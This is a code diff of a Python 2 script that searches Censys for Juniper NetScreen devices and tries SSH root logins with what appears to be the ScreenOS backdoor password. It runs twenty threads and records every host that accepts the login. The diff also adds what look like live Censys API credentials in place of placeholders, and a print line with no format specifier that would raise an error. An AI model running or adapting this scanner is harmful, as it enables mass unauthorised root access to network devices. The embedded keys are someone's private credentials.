@@ -12,14 +12,16 @@ user = "root"
 passwd = "<<< %s(un='%s') = %u"
 
 API_URL = "https://www.censys.io/api/v1"
-UID = "YOUR UID"
-SECRET = "YOUR SECRET"
+UID = "373ab943-2e4b-4088-b1ac-396c0c21ce2c"
+SECRET = "sRwAT71mrRJnyZBD95sjEjkFLXRjP5n6"
 
-PAGES = 50
-cur_page = 1
+PAGES = 1
+cur_page = 2
 thread_num = 20
-
+over_num = 0
 queue = Queue()
+
+ip_OK = open("ip_OK.txt", "w")
 
 class testTarget(threading.Thread):
     def __init__(self):
@@ -27,11 +29,20 @@ class testTarget(threading.Thread):
 
     def run(self):
         global queue
-        while True:
+        global ip_OK
+        global over_num
+        global thread_num
+        is_over = False
+        while not is_over:
             for i in range(5):
                 if not queue.empty():
                     ip = queue.get()
                 else:
+                    is_over = True
+                    over_num += 1
+                    if over_num == thread_num:
+                        ip_OK.close()
+                        sys.exit()
                     break
                 theSSH = connectSSH(ip, user, passwd)
                 if theSSH:
@@ -103,13 +114,12 @@ usage:
             query = "22.ssh.banner.software_version:NetScreen"
         else:
             query = "22.ssh.banner.software_version:NetScreen location.country:%s" % country
-    print query
-    ip_OK = open("ip_OK.txt", "w")
     getIp(query, cur_page)
-    test()
+    if not queue.empty():
+        test()
     while queue.qsize() > 0:
         if cur_page <= PAGES:
+            print "#########################################page: " % cur_page
             getIp(query, cur_page)
             cur_page += 1
         time.sleep(0.1)
-    ip_OK.close()
